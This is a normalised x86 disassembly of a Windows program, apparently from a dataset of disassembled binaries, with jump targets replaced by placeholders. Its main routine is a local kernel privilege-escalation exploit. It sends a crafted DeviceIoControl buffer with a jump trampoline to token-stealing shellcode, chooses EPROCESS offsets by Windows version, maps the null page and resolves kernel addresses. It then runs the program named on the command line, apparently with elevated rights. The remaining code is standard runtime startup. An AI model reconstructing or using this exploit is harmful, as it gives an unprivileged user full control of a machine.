sub_411410
push ebp
mov ebp esp
sub esp 0x190
push ebx
push esi
push edi
lea edi [ ebp - 0x190 ]
mov ecx 0x64
mov eax 0xcccccccc
[ edi ]
mov [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x68 ] 0x0
push 0x10
push 0x0
lea eax [ ebp - 0xcc ]
push eax
call sub_411082
add esp 0xc
push 0x44
push 0x0
lea eax [ ebp - 0xb4 ]
push eax
call sub_411082
add esp 0xc
mov [ ebp - 0xb4 ] 0x44
cmp [ ebp + 0x8 ] 0x2
je r-xdata
call j_sub_4118f0
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rw-data ] 0xc8
je r-xdata
or eax 0xffffffff
jmp r-xdata
push edx
mov ecx ebp
push eax
lea edx [ sub_4116c4 ]
call j_sub_411f70
pop eax
pop edx
pop edi
pop esi
pop ebx
add esp 0x190
cmp ebp esp
call j_sub_411f40
mov esp ebp
pop ebp
retn
mov esi esp
push 0x0
push 0x0
push 0x3
push 0x0
push 0x3
push 0x0
mov eax [ r--data ]
push eax
call [ CreateFileW@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0xd8
je r-xdata
mov [ ebp - 0x20 ] 0x18
mov esi esp
push 0x0
push 0x0
push 0x40000
call [ HeapCreate@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x2c ] eax
mov esi esp
mov eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ ebp - 0x2c ]
push ecx
call [ HeapAlloc@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x400
mov eax [ ebp - 0x38 ]
mov [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x38 ]
mov [ eax + 0x8 ] 0x200
mov eax [ ebp - 0x38 ]
mov [ eax + 0xc ] 0x200
mov eax [ ebp - 0x44 ]
mov [ eax + 0x28 ] 0x60087
mov eax [ ebp - 0x44 ]
mov [ eax + 0x24 ] 0x60087
mov [ ebp - 0x5c ] j_sub_4117c0
mov eax [ ebp - 0x5c ]
sub eax 0x21
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
and eax 0xff000000
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
shr eax 0x18
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x5c ]
shl eax 0x8
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x50 ] 0xe9
mov eax [ ebp - 0x50 ]
or eax [ ebp - 0x5c ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x50 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x68 ]
mov [ eax + 0x20 ] ecx
mov esi esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x38 ]
push edx
push 0x120028
mov eax [ ebp - 0x8 ]
push eax
call [ DeviceIoControl@IAT ]
cmp esi esp
call j_sub_411f40
mov esi esp
mov eax [ ebp - 0x8 ]
push eax
call [ CloseHandle@IAT ]
cmp esi esp
call j_sub_411f40
mov esi esp
lea eax [ ebp - 0xcc ]
push eax
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
push eax
push 0x0
call [ CreateProcessA@IAT ]
cmp esi esp
call j_sub_411f40
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov esi esp
push 0xffffffff
mov eax [ ebp - 0xcc ]
push eax
call [ WaitForSingleObject@IAT ]
cmp esi esp
call j_sub_411f40
mov esi esp
mov eax [ ebp - 0xcc ]
push eax
call [ CloseHandle@IAT ]
cmp esi esp
call j_sub_411f40
mov esi esp
mov eax [ ebp - 0xc8 ]
push eax
call [ CloseHandle@IAT ]
cmp esi esp
call j_sub_411f40
sub_4117c0
push ebp
mov ebp esp
sub esp 0xd8
push ebx
push esi
push edi
lea edi [ ebp - 0xd8 ]
mov ecx 0x36
mov eax 0xcccccccc
[ edi ]
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov esi 0x0
mov [ esi + 0x38 ] 0xff
mov [ esi + 0x34 ] 0xff
mov esi esp
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ rw-data ]
push ecx
call [ rw-data ]
cmp esi esp
call j_sub_411f40
mov esi esp
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call [ rw-data ]
cmp esi esp
call j_sub_411f40
mov eax [ ebp - 0x8 ]
add eax [ rw-data ]
mov ecx [ ebp - 0x14 ]
add ecx [ rw-data ]
mov edx [ ecx ]
mov [ eax ] edx
xor eax eax
push edx
mov ecx ebp
push eax
lea edx [ r-xdata ]
call j_sub_411f70
pop eax
pop edx
pop edi
pop esi
pop ebx
add esp 0xd8
cmp ebp esp
call j_sub_411f40
mov esp ebp
pop ebp
retn
sub_4118f0
push ebp
mov ebp esp
sub esp 0x2f8
push ebx
push esi
push edi
lea edi [ ebp - 0x2f8 ]
mov ecx 0xbe
mov eax 0xcccccccc
[ edi ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x90 ] 0x0
push 0x94
push 0x0
lea eax [ ebp - 0x234 ]
push eax
call sub_411082
add esp 0xc
mov [ ebp - 0x234 ] 0x94
push 0x100
push 0x0
lea eax [ ebp - 0x198 ]
push eax
call sub_411082
add esp 0xc
mov esi esp
lea eax [ ebp - 0x234 ]
push eax
call [ GetVersionExA@IAT ]
cmp esi esp
call j_sub_411f40
test eax eax
jne r-xdata
cmp [ ebp - 0x230 ] 0x6
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x230 ] 0x5
jne r-xdata
cmp [ ebp - 0x22c ] 0x0
je r-xdata
push edx
mov ecx ebp
push eax
lea edx [ r-xdata ]
call j_sub_411f70
pop eax
pop edx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
add esp 0x2f8
cmp ebp esp
call j_sub_411f40
mov esp ebp
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x22c ] 0x0
je r-xdata
cmp [ ebp - 0x22c ] 0x0
jne r-xdata
cmp [ ebp - 0x22c ] 0x1
jne r-xdata
cmp [ ebp - 0x22c ] 0x0
je r-xdata
cmp [ ebp - 0x22c ] 0x1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ rw-data ] 0xe0
jmp r-xdata
mov [ rw-data ] 0xf8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x22c ] 0x2
jne r-xdata
mov [ rw-data ] 0xc8
jmp r-xdata
jmp r-xdata
mov [ rw-data ] 0xd8
jmp r-xdata
jmp r-xdata
mov esi esp
push r--data
call [ LoadLibraryA@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov esi esp
push r--data
mov eax [ ebp - 0xc ]
push eax
call [ GetProcAddress@IAT ]
cmp esi esp
call j_sub_411f40
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi esp
push r--data
mov eax [ ebp - 0xc ]
push eax
call [ GetProcAddress@IAT ]
cmp esi esp
call j_sub_411f40
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi esp
lea eax [ ebp - 0x18 ]
push eax
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push 0xb
call [ rw-data ]
cmp esi esp
call j_sub_411f40
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi esp
mov eax [ ebp - 0x18 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi esp
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
push 0xb
call [ rw-data ]
cmp esi esp
call j_sub_411f40
cmp eax [ r--data ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x30 ] eax
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x198 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x48 ]
imul eax eax 0x11c
mov ecx [ ebp - 0x30 ]
lea edx [ ecx + eax + 0x4 ]
mov [ ebp - 0x54 ] edx
mov esi esp
push r--data
mov eax [ ebp - 0x54 ]
add eax 0x1c
push eax
call [ strstr@IAT ]
add esp 0x8
cmp esi esp
call j_sub_411f40
test eax eax
jne r-xdata
mov esi esp
lea eax [ ebp - 0x198 ]
push eax
call [ LoadLibraryA@IAT ]
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x6c ] eax
mov esi esp
push r--data
mov eax [ ebp - 0x6c ]
push eax
call [ GetProcAddress@IAT ]
cmp esi esp
call j_sub_411f40
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi esp
push r--data
mov eax [ ebp - 0x54 ]
add eax 0x1c
push eax
call [ strstr@IAT ]
add esp 0x8
cmp esi esp
call j_sub_411f40
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
sub eax [ ebp - 0x6c ]
add eax [ ebp - 0x3c ]
mov [ rw-data ] eax
mov esi esp
call [ GetCurrentProcessId@IAT ]
cmp esi esp
call j_sub_411f40
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x3c ] ecx
mov esi esp
push 0xffffffff
mov eax [ ebp - 0x60 ]
push eax
push 0x100
lea ecx [ ebp - 0x198 ]
push ecx
call [ strncpy_s@IAT ]
add esp 0x10
cmp esi esp
call j_sub_411f40
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x48 ]
cmp ecx [ eax ]
jae r-xdata
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x84 ] 0x1000
mov esi esp
push 0x40
push 0x103000
lea eax [ ebp - 0x84 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
push ecx
mov edi esp
call [ GetCurrentProcess@IAT ]
cmp edi esp
call j_sub_411f40
push eax
call [ rw-data ]
cmp esi esp
call j_sub_411f40
cmp eax [ r--data ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
sub_411d5f
call [ eax + eax + 0x1d680000 ]
inc ecx
add [ esi + 0x65 ] dh
jb r-xdata
int3
imul ebp [ edi + 0x6e ] 0x6f666e49
add [ ebx + 0x7a ] dh
dec esi
je r-xdata
int3
popad
insd
add [ gs : ebx + 0x52 ] dh
imul ebp [ gs : bx + 0x6e ] 0x657a6953
add [ edi + esi * 2 + 0x42 ] ah
popad
jae r-xdata
int3
inc ecx
jb r-xdata
int3
jae r-xdata
int3
add [ ebp + 0x6c ] dh
push ebx
jns r-xdata
int3
je r-xdata
int3
insd
dec ecx
outsb
outsw
inc edx
jne r-xdata
int3
jb r-xdata
int3
imul edi [ edx + 0x65 ] 0xcccccc00
int3
sub_411f40
jne r-xdata
push ebp
mov ebp esp
sub esp 0x0
push eax
push edx
push ebx
push esi
push edi
mov eax [ ebp + 0x4 ]
push 0x0
push eax
call j_sub_4126b0
add esp 0x8
pop edi
pop esi
pop ebx
pop edx
pop eax
mov esp ebp
pop ebp
retn
retn
sub_411f70
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor edi edi
mov esi edx
mov ebx ecx
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + edi ]
cmp [ ecx + ebx - 0x4 ] 0xcccccccc
jne r-xdata
mov ecx [ eax + edi + 0x8 ]
mov edx [ ebp + 0x4 ]
push ecx
push edx
call j_sub_412b40
add esp 0x8
mov edx [ eax + edi + 0x4 ]
add edx ecx
cmp [ edx + ebx ] 0xcccccccc
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
add edi 0xc
mov [ ebp - 0x4 ] eax
cmp eax [ esi ]
jl r-xdata
sub_411ff0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
test edx edx
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
push edi
mov al 0xcc
mov edi esi
mov ecx edx
[ edi ]
mov eax [ ebx ]
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] edx
mov [ ebx ] esi
pop edi
sub_412030
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
xor edi edi
mov ebx ecx
cmp esi edi
je r-xdata
mov edx 0xcccccccc
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x4 ]
inc edi
test eax eax
jne r-xdata
lea ebx [ ebx ]
test esi esi
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ edi + ecx + 0x8 ]
mov eax [ ebp + 0x4 ]
push edx
push eax
call j_sub_412b40
add esp 0x8
mov edx 0xcccccccc
mov eax [ eax + edi + 0x4 ]
add eax ecx
cmp [ eax + ebx ] edx
je r-xdata
cmp [ esi ] edx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + edi ]
mov edx 0xcccccccc
cmp [ ecx + ebx - 0x4 ] edx
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
add edi 0xc
mov [ ebp - 0x4 ] eax
cmp eax [ esi ]
jl r-xdata
mov ecx [ ebp + 0x4 ]
push edi
push esi
push ecx
call j_sub_412c80
add esp 0xc
mov edx 0xcccccccc
cmp [ esi + 0x14 ] edx
jne r-xdata
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
dec edi
test esi esi
jne r-xdata
mov ecx [ ebp + 0x4 ]
push edi
push esi
push ecx
call j_sub_412c80
add esp 0xc
mov edx 0xcccccccc
cmp [ esi + 0x18 ] edx
jne r-xdata
cmp [ esi + 0x1c ] edx
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax + esi - 0x4 ] edx
je r-xdata
sub_412140
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
mov [ rw-data ] 0x1
call sub_411190
push eax
call j_sub_413050
add esp 0x18
sub_4121d0
mov edi edi
push ebp
mov ebp esp
call sub_412620
mov [ rw-data ] eax
push 0x1
call [ __set_app_type@IAT ]
add esp 0x4
push 0xffffffff
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
mov ecx [ _fmode@IAT ]
mov edx [ rw-data ]
mov [ ecx ] edx
mov eax [ _commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call j_sub_413350
call j_sub_413340
cmp [ rw-data ] 0x0
jne r-xdata
call j_sub_4132a0
cmp [ rw-data ] 0xffffffff
jne r-xdata
push j_sub_413330
call [ __setusermatherr@IAT ]
add esp 0x4
xor eax eax
pop ebp
retn
push 0xffffffff
call [ _configthreadlocale@IAT ]
add esp 0x4
sub_412280
mov edi edi
push ebp
mov ebp esp
push j_sub_413380
call j_sub_4134e0
add esp 0x4
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
mov ecx [ rw-data ]
push ecx
push rw-data
push rw-data
push rw-data
call [ __getmainargs@IAT ]
add esp 0x14
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jge r-xdata
pop ebp
retn
push 0x8
call sub_4111a4
add esp 0x4
sub_412310
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push j_sub_4138f0
mov eax [ fs : 0x0 ]
push eax
add esp 0xffffffe4
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x24 ] 0x0
call j_sub_412610
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
push 0x0
push 0x0
push 0x1
push 0x0
call [ HeapSetInformation@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x20 ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x1f
call sub_4111a4
add esp 0x4
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push r--data
push r--data
call sub_4111f4
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0x0
mov ecx [ ebp - 0x20 ]
push ecx
push rw-data
call [ InterlockedCompareExchange@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ rw-data ] 0x2
je r-xdata
push r--data
push r--data
call sub_4110af
add esp 0x8
mov [ rw-data ] 0x2
jmp r-xdata
mov [ ebp - 0x2c ] 0xff
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x2c ]
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push r--data
push 0x0
push 0x1dc
push r--data
push 0x2
call [ _CrtDbgReportW@IAT ]
add esp 0x14
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push rw-data
call [ InterlockedExchange@IAT ]
int3
push 0x1
call [ _CrtSetCheckCount@IAT ]
add esp 0x4
mov ecx [ __initenv@IAT ]
mov edx [ rw-data ]
mov [ ecx ] edx
mov eax [ rw-data ]
push eax
mov ecx [ rw-data ]
push ecx
mov edx [ rw-data ]
push edx
call j_sub_411410
add esp 0xc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push rw-data
call j_sub_413780
add esp 0x4
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call [ exit@IAT ]
push 0x0
push 0x2
push 0x0
call [ rw-data ]
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call [ _cexit@IAT ]
mov eax [ rw-data ]
sub_41251f
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x28 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
push ecx
call [ _exit@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call [ _cexit@IAT ]
sub_412620
mov edi edi
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] __dos_header
mov eax [ ebp - 0x4 ]
movzx ecx [ eax ]
cmp ecx 0x5a4d
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x4550
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
movzx eax [ edx + 0x18 ]
cmp eax 0x10b
je r-xdata
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x74 ] 0xe
ja r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
xor eax eax
cmp [ edx + 0xe8 ] 0x0
setne al
xor eax eax
jmp r-xdata
sub_4126b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x4
ja r-xdata
mov edx r--data
push edx
mov eax 0x5
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
push ecx
push eax
call sub_412720
add esp 0x10
pop ebp
retn
mov ecx [ eax * 4 + rw-data ]
mov edx [ eax * 4 + r--data ]
cmp ecx 0xffffffff
je r-xdata
pop ebp
retn
push edx
push eax
mov eax [ ebp + 0x8 ]
push ecx
push eax
call sub_412720
add esp 0x10
sub_412720
mov edi edi
push ebp
mov ebp esp
sub esp 0xe40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
push ebx
mov [ ebp - 0xe38 ] eax
mov [ ebp - 0xe40 ] edi
mov [ ebp - 0xe3c ] 0x0
call j_sub_413090
add esp 0x4
mov [ ebp - 0xe30 ] eax
test eax eax
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
push edi
push 0x0
push 0xfde9
call esi
cmp eax 0x200
jae r-xdata
push ebx
call j_sub_413080
add esp 0x4
mov [ ebp - 0xe3c ] eax
mov [ ebp - 0xe34 ] r--data
push eax
lea ecx [ ebp - 0xe2c ]
push ecx
push 0xffffffff
push edi
push 0x0
push 0xfde9
call esi
test eax eax
je r-xdata
mov al 0x1
mov eax [ ebp - 0xe34 ]
mov ecx [ edi * 4 + r--data ]
push eax
push ebx
push ecx
push edi
call sub_412a70
add esp 0x10
test eax eax
jne r-xdata
lea edx [ ebp - 0xe2c ]
mov [ ebp - 0xe34 ] edx
jmp r-xdata
test al al
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call j_sub_4121b0
mov esp ebp
pop ebp
retn
xor al al
jmp r-xdata
push 0x1002
call sub_4129c0
mov edi [ ebp - 0xe38 ]
add esp 0x4
test eax eax
je r-xdata
push 0x104
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0xe30 ]
push eax
push 0x104
lea ecx [ ebp - 0x414 ]
push ecx
add ebx 0xfffffffb
push ebx
call j_sub_413930
add esp 0x18
test esi esi
je r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
jne r-xdata
int3
cmp [ ebp - 0xe3c ] 0x0
mov esi [ ebp - 0xe30 ]
jne r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push 0x0
push 0x0
push 0x30a
lea ecx [ ebp - 0xa2c ]
push ecx
push 0xffffffff
lea edx [ ebp - 0x414 ]
push edx
push 0x0
push 0xfde9
mov ebx r--data
call edi
test eax eax
je r-xdata
mov edx [ ebp - 0xe34 ]
mov ecx [ ebp - 0xe30 ]
push edx
push edi
push r--data
lea eax [ ebp - 0x20c ]
push eax
mov eax [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x414 ]
push edx
push eax
call esi
jmp r-xdata
push 0x0
push 0x0
push 0x30a
lea eax [ ebp - 0x720 ]
push eax
push 0xffffffff
lea ecx [ ebp - 0x20c ]
push ecx
push 0x0
push 0xfde9
mov esi r--data
call edi
test eax eax
je r-xdata
lea ebx [ ebp - 0xa2c ]
add esp 0x1c
cmp eax 0x1
jne r-xdata
mov edx [ ebp - 0xe40 ]
mov eax [ ebp - 0xe38 ]
mov ecx [ ebp - 0xe30 ]
push edx
mov edx [ ebp + 0xc ]
push eax
push r--data
push esi
push ecx
push ebx
push edx
call [ ebp - 0xe3c ]
lea esi [ ebp - 0x720 ]
sub_4129c0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push j_sub_4138f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x19 ] al
mov [ ebp - 0x34 ] 0x1001
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
lea edx [ ebp - 0x19 ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x34 ]
push ecx
push 0x6
push eax
push 0x406d1388
call [ RaiseException@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
movzx eax [ ebp - 0x19 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a70
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push j_sub_4138f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x19 ] al
mov [ ebp - 0x34 ] 0x1002
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x28 ] ecx
lea edx [ ebp - 0x19 ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x34 ]
push edx
push 0x6
push eax
push 0x406d1388
call [ RaiseException@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
movzx eax [ ebp - 0x19 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b40
mov edi edi
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x408 ] eax
mov eax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x0
push ebx
push esi
je r-xdata
mov ebx r--data
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
add ecx 0x2d
cmp ecx 0x400
ja r-xdata
lea ebx [ ebp - 0x404 ]
xor ecx ecx
lea esp [ esp ]
mov dl [ ecx + r--data ]
mov [ ebp + ecx - 0x404 ] dl
inc ecx
test dl dl
jne r-xdata
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push edi
lea edi [ ebp - 0x404 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
mov eax r--data
[ edi ] [ esi ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ ebp - 0x404 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x408 ]
push ebx
push 0x2
push eax
push ecx
call sub_412720
add esp 0x10
pop esi
pop ebx
sub_412c80
mov edi edi
push ebp
mov ebp esp
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push esi
mov esi [ ebp + 0xc ]
push edi
